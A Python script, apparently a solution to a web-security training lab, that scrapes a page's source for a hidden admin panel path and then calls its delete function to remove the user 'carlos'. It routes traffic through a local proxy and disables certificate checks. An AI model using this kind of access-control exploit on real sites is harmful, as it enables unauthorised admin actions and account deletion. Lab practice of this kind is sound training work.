import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':  'http://127.0.0.1:8080'}

def delete_user(url):

    res = requests.get(url, verify=False, proxies=proxies)

    # Retrieve session cookie
    session_cookie = res.cookies.get_dict().get('session')

    # Retrieve the admin panel
    soup = BeautifulSoup(res.text, 'html.parser')
    admin_instances = soup.find(text=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)

    # Delete carlos user
    cookies = {'session': session_cookie}
    delete_user_carlos_path = admin_path + "/delete?username=carlos"

    res = requests.get(url + delete_user_carlos_path, cookies=cookies, verify=False, proxies=proxies)

    if res.status_code == 200:
        print("[+] Carlos user deleted!")
    else:
        print("[-] Deletion failed")
        print("[-] Existing script...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: python {sys.argv[0]} <url>")
        print(f"[+] Example: python {sys.argv[0]} https://example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Finding admin panel...")
    delete_user(url)


if __name__ == "__main__":
    main()